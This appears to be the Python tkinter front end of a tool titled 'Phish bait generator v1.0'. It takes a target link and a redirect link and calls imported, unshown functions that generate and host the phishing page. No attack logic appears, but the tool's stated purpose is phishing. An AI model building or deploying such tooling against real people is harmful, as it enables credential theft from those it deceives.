import tkinter
from tkinter import *
from generator import hostfile, generate_phish

def generate():
    ent = target_entry.get()
    generate_phish(ent)

root = Tk()
root.title("Phish bait generator v1.0")
root.resizable(width=False, height=False)
#root.config(background='black')


target_txt = Label(text="Target link{:>5}".format(":"), font=('Verdana', '9'))
target_txt.grid(row=0, column=0, padx=10, pady=10)

target_entry = Entry(width=50, bd=1)
target_entry.insert(0, 'paste target link here')
target_entry.bind("<FocusIn>", lambda args:target_entry.delete('0', 'end'))
target_entry.grid(row=0, column=1, pady=10)

target_browse_txt = Button(text="Browse", bd=1)
target_browse_txt.grid(row=0, column=2, padx=10)


redirect_txt = Label(text="Redirect link :", font=('Verdana', '9'))
redirect_txt.grid(row=1, column=0, padx=10, pady=5)

redirect_entry = Entry(width=50, bd=1)
redirect_entry.insert(0, 'paste your redirect link here')
redirect_entry.bind("<FocusIn>", lambda args:redirect_entry.delete('0', 'end'))
redirect_entry.grid(row=1, column=1, pady=5)


method_txt = Label(text="{:<40}".format("Method :"), font=('Verdana', '9'))
method_txt.grid(row=2, column=1, padx=10, pady=10)

method_entry = Radiobutton(text="get")
method_entry.grid(row=2, column=1, pady=10)


generate_btn = Button(text="Generate", bd=1, command=generate)
generate_btn.grid(row=3, column=1, pady=10, sticky=S+W+N+E)

host_file = Button(text="Host", bd=1, command=hostfile)
host_file.grid(row=3, column=2, padx=10)


root.mainloop()
